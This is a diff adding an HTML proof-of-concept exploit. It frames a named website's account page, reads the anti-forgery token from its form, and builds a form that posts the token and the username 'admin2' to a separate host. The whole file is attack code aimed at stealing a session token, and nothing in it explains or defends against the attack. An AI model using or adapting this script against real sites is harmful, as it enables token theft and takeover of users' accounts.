@@ -1,0 +1,17 @@
+<iframe id="iframe" src="https://editpointindia.com/youraccount" width="500" height="500" onload="read()"></iframe>
+
+<script> 
+function read()
+{
+    var name = 'admin2';
+    var token = document.getElementById("iframe").contentDocument.forms[0].token.value;
+    document.writeln('<form width="0" height="0" method="post" action="http://www.yoursebsite.com/check.php"  enctype="multipart/form-data">');
+    document.writeln('<input id="username" type="text" name="username" value="' + name + '" /><br />');
+    document.writeln('<input id="token" type="hidden" name="token" value="' + token + '" />');
+    document.writeln('<input type="submit" name="submit" value="Submit" /><br/>');
+    document.writeln('</form>');
+    //document.forms[0].submit.click();
+	alert(token)
+}
+</script>
+
